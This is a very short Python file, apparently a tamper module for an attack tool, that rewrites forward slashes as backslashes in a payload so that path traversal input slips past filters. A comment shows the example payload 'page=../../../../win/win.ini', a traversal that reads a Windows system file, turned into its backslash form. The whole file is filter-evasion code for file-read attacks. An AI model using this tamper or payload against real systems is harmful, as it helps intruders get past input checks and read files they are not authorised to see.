# page=../../../../win/win.ini  =>  page=..\..\..\..\win\win.ini

def tamper(payload:str):
    if payload:
        payload=payload.replace('/','\\')
    return payload